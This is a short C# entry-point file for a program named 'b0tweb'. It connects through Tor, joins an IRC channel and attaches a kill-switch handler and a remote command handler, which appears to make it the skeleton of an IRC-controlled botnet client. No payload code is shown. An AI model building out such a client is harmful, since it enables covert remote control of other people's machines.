using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using b0tweb.MessageHandlers;

namespace b0tweb
{
    /// <summary>
    /// Startup class for our program.
    /// </summary>
    class Program
    {
        private const string Channel = "#b0tweb";

        /// <summary>
        /// Default main function to start the program.
        /// </summary>
        /// <param name="args">The command line arguments.</param>
        public static void Main(string[] args)
        {
            Console.WriteLine("Welcome to the b0tweb");

            TorProxy proxy = new TorProxy();
            proxy.Establish();

            Console.WriteLine("Connection to Tor successfuly established!");

            IRCConnectionController controller = new IRCConnectionController();

            controller.AddMessageHandler(new KillSwitchHandler());
            controller.AddMessageHandler(new CommandMessageHandler());

            controller.Join(Program.Channel);
            controller.Listen();

            proxy.Disconnect();
        }
    }
}
